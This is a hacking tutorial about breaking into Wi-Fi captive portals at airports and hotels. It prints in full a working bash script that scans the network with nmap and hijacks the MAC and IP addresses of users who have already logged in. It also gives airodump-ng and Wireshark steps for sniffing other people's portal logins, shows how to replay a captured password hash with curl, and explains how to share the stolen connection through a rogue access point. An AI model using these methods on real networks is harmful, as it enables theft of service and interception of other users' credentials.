## What is Captive Portal?

With a Captive Portal you may encounter at the airport, hotel, condo, business centers, also now some mobile operators organize Wi-Fi access points using intercepting portals (hotspot with authorization on the web-interface).

  

If you do not quite understand what I mean, then look at the screenshot:

image

There is an open Wi-Fi network to which you can connect without a password (an access point without encryption), but when you try to access any site, we will be redirected to the page where you need to enter credentials, make payment, confirm the phone number via SMS or something similar.

  

Captive Portal is an alternative way (instead of password protected Wi-Fi networks) to restrict access to the global network. Thanks to this approach, it is possible to flexibly regulate access to the Internet network (for example, to issue credential that are valid for a specified period of time), and monitor the activity of a particular user.

  

Sometimes, to gain access, simply enter a PIN from a free SMS message, or ask for a login and password in the lobby. But sometimes you need to buy access.

  

### Easy and quick hacking hot-spot with authorization on the web-interface

We will use hack-captive-portals, a script for hacking any captive portals using the MAC spoofing technique.

If you have Kali Linux, Ubuntu, Linux Mint, Debian or any of their derivatives, then install a couple of packages:

`> sudo apt -y install sipcalc nmap`

You can download the script as follows:

```
> wget https://raw.githubusercontent.com/systematicat/hack-captive-portals/master/hack-captive.sh
> sudo chmod u+x hack-captive.sh
```

  

But I have slightly modified this script (on some networks, there will not be a difference in work, but for some, the work will be much more stable and much faster at the expense of skipping explicit dummies).

To use my version, create a file hack-captive-mial.sh:

`gedit ./hack-captive-mial.sh`

  

```
#!/usr/bin/env bash

# =========================================================================== #

# FILE: hack-captive-mial.sh #
# USAGE: sudo ./hack-captive-mial.sh #

# #

# DESCRIPTION: This script helps to pass through the captive portals in #
# public Wi-Fi networks. It hijacks IP and MAC from somebody #
# who is already connected and authorized on captive portal. #
# Tested in Ubuntu 16.04 with different captive portals in #
# airports and hotels all over the world. #

# #

# REQUIREMENTS: coreutils, sipcalc, nmap #
# NOTES: Let the information always be free! #
# AUTHOR: Stanislav "systematicat" Kotivetc, <@systematicat> #
# COMPANY: Hire me! I am a cool dude! #
# VERSION: 1.0 #
# CREATED: 16.12.2016 - 23:59 #
# REVISION: --- #
# COPYRIGHT: 2016 Stanislav "systematicat" Kotivetc #
# LICENSE: WTFPL v2 #

# =========================================================================== #

# FIX: MiAl (HackWare.ru) #

# =========================================================================== 


# Find the initial parameters of wireless interface
interface="$(ip -o -4 route show to default | awk '/dev/ {print $5}' | head -n1)"
localip="$(ip -o -4 route get 1 | awk '/src/ {print $7}')"
wifissid="$(iw dev "$interface" link | awk '/SSID/ {print $NF}')"
gateway="$(ip -o -4 route show to default | awk '/via/ {print $3}')"
broadcast="$(ip -o -4 addr show dev "$interface" | awk '/brd/ {print $6}')"
ipmask="$(ip -o -4 addr show dev "$interface" | awk '/inet/ {print $4}')"
netmask="$(printf "%s\n" "$ipmask" | cut -d "/" -f 2)"
netaddress="$(sipcalc "$ipmask" | awk '/Network address/ {print $NF}')"
network="$netaddress/$netmask"
macaddress="$(ip -0 addr show dev "$interface" \
| awk '/link/ && /ether/ {print $2}' \
| tr '[:upper:]' '[:lower:]')"

# Check for running as root
function check_sudo() {

if [[ "$EUID" -ne 0 ]]; then
	printf "%b\n" "ERROR This script must be run as root. Use sudo." >&2
	exit 1
fi
}

# Create a temporary folder for script work
function create_tmp() {
	unset tmp
	tmp="$(mktemp -q -d "${TMPDIR:-/tmp}/hackaptive_XXXXXXXXXX")" || {
	printf "%b\n" "ERROR Unable to create temporary folder. Abort." >&2
	exit 1
}
}

# Clean tmp/ on exit due to any reason
function clean_up() {
	rm -rf "$tmp"
	trap 0
	exit
}

# Split up big networks into smaller chunks of /24
function calc_network() {
	printf "%b\n" "Exploring network in \"$wifissid\" Wi-Fi hotspot."
	if [[ "$netmask" -lt 24 ]]; then
	sipcalc -s 24 "$network" \
	| awk '/Network/ {print $3}' > "$tmp"/networklist.$$.txt
		printf "%b\n" "Splitting up network $network into smaller chunks."
	else
		printf "%s\n" "$network" | cut -d "/" -f 1 > "$tmp"/networklist.$$.txt
	fi
}

routermac="$(nmap -n -sn -PR -PS -PA -PU -T5 $gateway | grep -E -o '[A-Z0-9:]{17}' | tr A-Z a-z)"

# Select network, set netmask, scan it for IP and MAC and hijack them. Repeat.
function main() {
	while read -r networkfromlist; do
	if [[ "$netmask" -lt 24 ]]; then
		network="$networkfromlist/24"
	else
		network="$networkfromlist/$netmask"
	fi
	
	# Scan selected network for active hosts.
	printf "%b\n" "Looking for active hosts in $network. Please wait."
	nmap -n -sn -PR -PS -PA -PU -T5 --exclude "$localip","$gateway" "$network" \
	| awk '/for/ {print $5} ; /Address/ {print $3}' \
	| sed '$!N;s/\n/ - /' > "$tmp"/hostsalive.$$.txt
	
		#Set founded IP and MAC for wireless interface
		while read -r hostline; do
			newipset="$(printf "%s\n" "$hostline" | awk '{print $1}')"
			newmacset="$(printf "%s\n" "$hostline" \
			| awk '{print $3}' \
			| tr '[:upper:]' '[:lower:]')"
			if [ "$routermac" != "$newmacset" ]; then
				printf "%b\n" "Trying to hijack $newipset - $newmacset"
				ip link set "$interface" down
				ip link set dev "$interface" address "$newmacset"
				ip link set "$interface" up
				ip addr flush dev "$interface"
				ip addr add "$newipset/$netmask" broadcast "$broadcast" dev "$interface"
				ip route add default via "$gateway"
				sleep 1
				
				# Check if Google DNS pingable with our new IP and MAC
				ping -c1 -w1 8.8.8.8 >/dev/null
				if [[ $? -eq 0 ]]; then
					printf "%b\n" "Pwned! Now you can surf the Internet!"
					exit 0
				fi
			else
				printf "%b\n" "Skipped $newipset - $newmacset"
			fi
			done < "$tmp"/hostsalive.$$.txt
			rm -rf "$tmp"/hostsalive.$$.txt
			printf "%b\n" "Suitable hosts not found. Checking another network chunk."
		done < "$tmp"/networklist.$$.txt
		rm -rf "$tmp"/networklist.$$.txt
		printf "%b\n" "No luck! Try again later or try another Wi-Fi hotspot."
	
	# Restore original MAC and IP
	ip link set "$interface" down
	ip link set dev "$interface" address "$macaddress"
	ip link set "$interface" up
	ip addr flush dev "$interface"
	ip addr add "$ipmask" broadcast "$broadcast" dev "$interface"
	ip route add default via "$gateway"
}

#Functions start here

trap clean_up 0 1 2 3 15
check_sudo
create_tmp
calc_network
main
```

  

Make the file executable:
`sudo chmod u+x hack-captive-mial.sh`

Run it:
`sudo ./hack-captive-mial.sh`

Or (if using the original version):
`sudo ./hack-captive.sh`

And wait for the result.

As soon as you see the line

**"Pwned! Now you can surf the Internet!"**

So you already have Internet access!

Again, check the ping:
We try to open the site (I go to SuIP.biz to find out at the same time ‘my’ Internet service provider):


### How to make the Captive Portal signal accessible to other devices

Regardless of how you accessed (legally or not), you can share your Internet connection for multiple devices. You can even open Internet access from a virtual machine to a real computer…
By itself, we need 2 Wi-Fi adapters: one is connected to the Captive Portal, the second one distributes Internet connection.
At the previous stage - when we hacked the Intercepting Portal, it is possible that we made the connection using Network Manager. We will reduce the number of incomprehensible hangs if we perform the following actions without using NetworkManager.

Install additional packages if you do not already have them:
```
sudo apt install wpasupplicant
sudo apt install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables
git clone https://github.com/oblique/create_ap
cd create_ap
sudo make install
cd .. && rm -rf create_ap
```

Now stop NetworkManager:
```
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
```

If you are running from a virtual machine, you need to disconnect (virtual) wired connection so that the script does not get confused when it looks for the default gateway (if necessary, change eth0 to the name of your Ethernet interface):
`sudo ip link set eth0 down`

Create a configuration file, for example, with the name wpa_sup.conf:
`gedit wpa_sup.conf`

Copy the following into it (replace i_spac_5FL-2.4GHz with the name of the Network of the Captive Portal):
```
network={
	ssid="i_spac_5FL-2.4GHz"
	key_mgmt=NONE
	priority=100
}
```

We are connecting (replace wlan0 with the name of your wireless interface used to connect to the Captive portal, if you chose a different name for the configuration file, write it instead of wpa_sup.conf):
`sudo wpa_supplicant -i wlan0 -c wpa_sup.conf`

Wait for the appearance of such a line (should contain the words CTRL-EVENT-CONNECTED - Connection to):
`wlan0: CTRL-EVENT-CONNECTED - Connection to 88:dc:96:55:19:e4 completed [id=0 id_str=]
`
Since we did not send the process to the background, open a new console window (do not close the previous one, otherwise the connection to the Captive Portal will fail), enter in a new window (this is necessary for our wireless interface to be assigned an IP address):
`sudo dhclient wlan0`

At this point, run the script for hacking Captive Portal:
`sudo ./hack-captive-mial.sh`
Wait for the successful completion.

Now we need to set up a wireless access point, which as an Internet access source will use the interface with the Captive portal. We look at the names of our network interfaces:
`iw dev`

Run create_ap as follows:
`sudo create_ap <INTERFACE_FOR_AP> <INTERFACE_WITH_INTERNET> <AP_NAME>`

I want to create an AP with the name ‘HackWare’ on the wlan1 interface, using the wlan0 interface for Internet access, then my command:
`sudo create_ap wlan1 wlan0 HackWare`

If the line appears
`wlan0: AP-ENABLED`
then everything went well.

The command above creates an AP, the connection to which is not protected by a password, if you want to create a password protected AP, then use the command of the form:
`sudo create_ap <INTERFACE_FOR_AP> <INTERFACE_WITH_INTERNET> <AP_NAME> <PASSWORD>`

For example, for my AP to have the password MiAlrules, I use the command:
`sudo create_ap wlan1 wlan0 HackWare MiAlrules`

If your wireless adapter supports IEEE 802.11n, you can use the --ieee80211n option, which enables IEEE 802.11n:
`sudo create_ap --ieee80211n wlan1 wlan0 HackWare MiAlrules`

Since all the operations I performed in a virtual machine, to which two USB Wi-Fi adapters are connected, the virtual machine now has the Internet access, and the real computer does not have it. But since the virtual machine is launched in a laptop with a built-in Wi-Fi adapter, my real computer connects to the Access Point that the virtual computer creates:

..image

The connection was successful and now the main computer has access to the Internet:

..image

It seems funny to me: the non-existent virtual computer provides a real iron computer with the Internet!

I also connect my other devices (mobile phones) to the access point from the virtual machine:

### How does Captive Portal work?
To understand why it's so easy to bypass the Captive Portal, and see other ways to bypass, you need to understand exactly how Captive Portal works.

As you can already see, this is an open Access Point, to which anyone can connect. Let's remember this: we have access to the local network without any break-ins. If the phrase ‘local network’ immediately brings to mind the word sniffing’, then you are right!

Network equipment is configured to redirect everyone, who have connected to a Hot Spot, to the same web page, which hosts the conditions for access to the network. On this page, the user enters a PIN from the SMS or login and password. Typically, HTTP (rather than HTTPS) is used to access the Web page of the Captive Portal. This is due to the peculiarities of the local network: for local addresses it is impossible to get valid SSL certificates, and using the invalid does not add anything to security, but it creates additional problems.

By the way, if you connect to the Portal and try to open something in a web browser, but you do not redirect to the Captive Portal web page, it's likely that you are trying to access a site with an HTTPS protocol, try to open any site on HTTP and you will be thrown to the ‘entrance’ page,

To prevent users from using non-standard ports (for example, to connect to a VPN, use the Tor browser or a proxy), all traffic on all ports is blocked. But it is necessary to skip UDP traffic on port 53, which is used for requests to the DNS server.

After the user entered the correct credentials, his MAC address and IP address are unrestricted. The binding goes exactly to the MAC address (or to the MAC address and IP address pair).

Here is described the ‘strong’ configuration of the interception portal. Specific implementations may be even weaker: for example, a DNS server can be used to redirect to the Portal page, which will respond to all requests with the IP address of Captive Portal, and there will not be proper traffic filtering. As a result, you can bypass this Portal simply by using a standard VPN connection, or by setting it in the DNS server settings in conjunction with the Tor browser, etc.


### How to bypass Captive Portal
Now that we understand what principles Captive Portal is based on, its weaknesses are very clearly visible.
The first method of hacking a Captive Portal: stealing MAC and IP addresses
This method uses the hack-captive-portals script: it intercepts the IP and MAC from someone who is already connected and authorized in the intercepting portal.
The principle of operation is very simple: the script finds all the ‘live’ hosts on the local network and ‘tries on’ their MAC and IP, immediately after trying on the test is made - is the global network available. If available, the script stops the work, and we can enjoy the wonders of the Internet. If the external network is unavailable, the next MAC and IP are tried, etc.

It's very simple, but it's VERY effective. A mandatory requirement, there must be someone on the local network who is already authorized in the Intercepting Portal. In principle, it is possible to write out several MAC-IP working pairs and connect even when ‘hosts are not at home’, but such pairs can ‘fade’, they can be valid, for example, only within 24 hours (from the moment of authentication by a legitimate user, and not from the moment when we find them out).

However, this is a very effective and most reliable method.

The second method of Captive Portal hacking: using UDP VPN on port 53

Typically, in Captive Portals, all TCP and UDP ports are blocked for non-authenticated users. All but one, it is port 53 UDP. This port is required to query DNS servers to convert host names to IP. You need to start by checking if DNS queries are not spoofed (usually not). To do this, execute the dig command several times for different hosts, for example, to get the IP host ya.ru:
`dig @8.8.8.8 ya.ru +short`

To get an IP host [google.com](http://google.com)
`dig @8.8.8.8 google.com +short`

And so on. If the results are different (and not, for example, every time 192.168.88.1 or another local IP address), then DNS queries are passed and port 53 UDP is open.

Via port 53, you can configure a UDP proxy, VPN, or other tunnel. Free UDP VPN on port 53 can be found right in Google.

However, this method did not work for me on the intercepting portal in the immediate vicinity of me, maybe I was not quite right doing something, perhaps the problem in a particular VPN service provider, or, nevertheless, my Intercepting Portal somehow way limited/blocked traffic and on the port 53 UDP.

A huge plus of this method is that we do not need a client that has been successfully authenticated in the Portal.

The third method of hacking Captive Portal: stealing credentials of legitimate users

Since in Captive Portal we are with other users on the same local network, and the data for authorization on the Portal is sent over the HTTP protocol (and not HTTPS), then the following scheme seems to work:
- connect to an open network
- launch ARP spoofing
- start sniffing
- we analyze the received data: we search in them login and the password

But we can use a less invasive (and much more convenient) method.
We will take advantage of the fact that in open networks traffic is transmitted without encryption. Therefore, we will not connect to the network, but we will use Airodump-ng to listen for traffic.

Stop Network Manager and kill the processes that can prevent us:
```
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
```

Further in the commands, if necessary, replace the name wlan0 with the name of your wireless interface.
```
Set the adapter in monitor mode
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

Launch airodump-ng to find out which channel the Access Point of interest is:
`sudo airodump-ng wlan0`

As you can see in the screenshot, there are several open APs at different frequencies. I choose the one that has the stronger signal (because it and its clients should be closer to me).

Run airodump-ng again with the following options:
- -w /root/open - this option to save the captured data to a file
- --channel 10 - we set up a certain channel so that airodump constantly listens to it and does not jump on other channels

`sudo airodump-ng --channel 10 -w /root/cap wlan0`

Now just wait, when enough data is accumulated. We need to ensure that not only an authenticated user is present on the network, we need to wait until the authenticated user enters his credentials. Depending on the number of network users, it may take several hours or more.

Pay attention to the #Data field. If it does not change at all, then no one is connected to the access point. If it changes sluggishly, then someone is connected, but not surfing on Inernet.

To analyze the data, open the capture file (I call it /root/cap-01.cap) in the Wireshark program:

..image

To speed up the search, use the Wireshark filters.

A filter that only shows data sent by the POST method:
`http.request.method == "POST"`

A filter that only shows data sent by the GET method:
`http.request.method == "GET"`

Filter to display all HTTP traffic (the filter is written in lowercase letters!):
`http`

Another way to display all HTTP traffic:
`tcp.port == 80`

Search for requests to a specific site (host):
`http.host == "<URL>"`

Search for requests to a specific site (host) by partial name:
`http.host contains "here.partial name "`

Show all traffic from a specific IP
`ip.src == 196.168.1.1`

Show all traffic to a specific IP
`ip.dst == 196.168.1.1`

Show all traffic that has the specified IP as the source OR of the destination:
`ip.addr == 196.168.1.1`

To speed up the process, I connected from another device and logged in with arbitrary data: I entered 11111111 as the user name, and 22222222 as the password.

Intercepted data:
There are various useful information, but the main line is:
`username=11111111&password=15b4c47a3e0e44b9e40db20ac1225023&dst=http%3A%2F%2Fdetectportal.firefox.com%2Fsuccess.txt&popup=true`

Unfortunately, instead of the password there is a hash: _15b4c47a3e0e44b9e40db20ac1225023_. And not just a hash, the source code shows that salt was added to the password before the conversion:

The address of the JavaScript file: [http://portal.cloud-hotspot.com/md5.js](http://portal.cloud-hotspot.com/md5.js), it has the same hexMD5 function:
`function hexMD5 (str) { return binl2hex(coreMD5( str2binl(str))) }`

The password is first converted to a binary string, then its MD5 hash is considered, then the binary string is converted to hexadecimal.

You can say that I was not lucky. If you managed to intercept the password in clear form, then everything is fine. If you have a similar situation when the password is hashed, it can still be used! Although this requires unnecessary action on our part.

It is important for the server to get the correct string, and how it is created, it does not check in any way. Therefore, we can simply send a request using curl containing all the necessary data and the server will perfectly accept our hash instead of the password itself, since it also receives a hash from other users (and not a password, as is usually done on websites where the hash is computed on the server side).

Moreover, in order not to use curl every time, you can create a simple HTML file with the correct form that will send all the necessary data, including the hash. This file can be uploaded to the phone and the phone will be able to login a Portal.

In any case, it will be necessary to correctly identify all transmitted fields (with Burp Suite for easy), including hidden ones, specify the correct referrer, if necessary, etc. All these problems can be solved.

Disadvantage of the method:
- It is necessary not only the presence of a legitimate user who logged in to the portal, but also to find the moment when he logs in
- if you are allowed to use credentials for only one device, you will have problems if you and a legitimate user are simultaneously trying to access the Internet through the Portal
- the password can be passed in the form of a hash, which complicates its use

The advantages of this method:
- after the capture of credentials, you can use the Internet in the Portal, even if it does not have legitimate users
- if you are allowed to use credentials on multiple devices, you can log on from several computers / phones

Conclusion
Considered the most common configurations of Captive Portal (hotspots with authorization via the web interface). The article contains the most effective methods of bypassing.

To hack a Captive Portal you can use the hack-captive-portals script, which brings full automation and great results.